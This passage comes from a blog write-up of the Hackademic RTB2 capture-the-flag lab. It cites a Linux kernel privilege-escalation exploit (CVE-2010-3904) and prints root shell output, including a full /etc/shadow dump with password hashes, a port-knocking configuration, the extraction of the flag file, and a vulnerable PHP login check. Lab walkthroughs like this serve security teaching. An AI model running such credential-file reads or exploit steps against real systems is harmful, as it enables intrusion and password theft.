<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15285.c">https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15285.c&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[+] rds
</span><span class='line'>   CVE-2010-3904
</span><span class='line'>   Source: &lt;a href="http://www.exploit-db.com/exploits/15285/">http://www.exploit-db.com/exploits/15285/&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat /etc/shadow&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>cat /etc/shadow
</span><span class='line'>root:$6$YB3puY.G$drg9.SqpJyPujoS82zbwdQtM7xgPpAJlDmdQaH8tu2ndUrmNwIx29lYazyhhsFKKF.yw6ScopFmMAh.t/qIZn0:14999:0:99999:7:::
</span><span class='line'>daemon:&lt;em>:14837:0:99999:7:::
</span><span class='line'>bin:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>sys:&lt;em>:14837:0:99999:7:::
</span><span class='line'>sync:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>games:&lt;em>:14837:0:99999:7:::
</span><span class='line'>man:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>lp:&lt;em>:14837:0:99999:7:::
</span><span class='line'>mail:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>&lt;a href="news:*:14837:0:99999:7:::">news:*:14837:0:99999:7:::&lt;/a>
</span><span class='line'>uucp:&lt;em>:14837:0:99999:7:::
</span><span class='line'>proxy:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>www-data:&lt;em>:14837:0:99999:7:::
</span><span class='line'>backup:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>list:&lt;em>:14837:0:99999:7:::
</span><span class='line'>irc:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>gnats:&lt;em>:14837:0:99999:7:::
</span><span class='line'>nobody:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>libuuid:!:14837:0:99999:7:::
</span><span class='line'>syslog:&lt;em>:14837:0:99999:7:::
</span><span class='line'>messagebus:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>avahi-autoipd:&lt;em>:14837:0:99999:7:::
</span><span class='line'>avahi:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>couchdb:&lt;em>:14837:0:99999:7:::
</span><span class='line'>speech-dispatcher:!:14837:0:99999:7:::
</span><span class='line'>usbmux:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>haldaemon:&lt;em>:14837:0:99999:7:::
</span><span class='line'>kernoops:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>pulse:&lt;em>:14837:0:99999:7:::
</span><span class='line'>rtkit:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>saned:&lt;em>:14837:0:99999:7:::
</span><span class='line'>hplip:&lt;/em>:14837:0:99999:7:::
</span><span class='line'>gdm:*:14837:0:99999:7:::
</span><span class='line'>p0wnbox:$6$AT8lMX0W$GPAZaGLMX0mi5EPFhx9wT5qJu9bxkIEfH.cmKX/j/O3QpRWXgBQ2WUAa.SIoFGdcfKrv.FtuBVn1UonfItMrw1:14999:0:99999:7:::
</span><span class='line'>mysql:!:14991:0:99999:7:::&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>pwd&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>pwd
</span><span class='line'>/root&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>ls -l&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>ls -l
</span><span class='line'>total 40
</span><span class='line'>drwxr-xr-x 2 root root  4096 Jan 17  2011 Desktop
</span><span class='line'>-rwxr-xr-x 1 root root 33921 Jan 22  2011 Key.txt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat /etc/knockd.conf&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>cat /etc/knockd.conf
</span><span class='line'>[options]
</span><span class='line'>        UseSyslog&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[openHTTPD]
</span><span class='line'>        sequence    = 7000,8000,9000
</span><span class='line'>        seq_timeout = 5
</span><span class='line'>        command     = /sbin/iptables -I INPUT -s %IP% -p tcp &ndash;dport 666 -j ACCEPT
</span><span class='line'>        tcpflags    = syn&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[closeHTTPD]
</span><span class='line'>        sequence    = 9000,8000,7000
</span><span class='line'>        seq_timeout = 5
</span><span class='line'>        command     = /sbin/iptables -D INPUT -s %IP% -p tcp &ndash;dport 666 -j ACCEPT
</span><span class='line'>        tcpflags    = syn&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>base64 -d /root/Key.txt > /var/www/key.png&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>base64 -d /root/Key.txt > /var/www/key.png</span></code></pre></td></tr></table></div></figure></p>

<p>We can check the flag <a href="http://192.168.80.150:666/key.png">here</a>. As we can see
from output above, there is port-knocking mechanism using sequences 7000,8000,9000.</p>

<p>Finally we want to see the check.php source:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">welcome</span><span class="o">/</span><span class="nx">check</span><span class="o">.</span><span class="nx">php</span><span class="o">&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nx">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">welcome</span><span class="o">/</span><span class="nx">check</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=UTF-8&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">Hackademic</span><span class="o">.</span><span class="nx">RTB2</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;&lt;</span><span class="nx">center</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">body</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;black&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;hackademicrtb2.png&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="s2">&quot;green&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$pass_answer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">ndash</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'><span class="nv">$pass_answer_2</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span> <span class="k">OR</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">ndash</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">password</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="nv">$pass_answer</span> <span class="k">or</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">password</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="nv">$pass_answer_2</span><span class="p">){</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">Ok</span><span class="p">,</span> <span class="nx">nice</span> <span class="nx">shot</span><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="nx">h2</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span><span class="nx">but</span><span class="p">,</span> <span class="nx">you</span> <span class="nx">are</span> <span class="nx">looking</span> <span class="nx">in</span> <span class="nx">a</span> <span class="nx">wrong</span> <span class="nx">place</span> <span class="nx">bro</span><span class="o">!</span> <span class="p">;</span><span class="o">-</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="s2">&quot;black&quot;</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">63</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">34</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">66</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">34</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">66</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">34</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">66</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">39</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">66</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">38</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">35</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">35</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">34</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">66</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">36</span><span class="o">%</span><span class="mi">66</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">39</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span 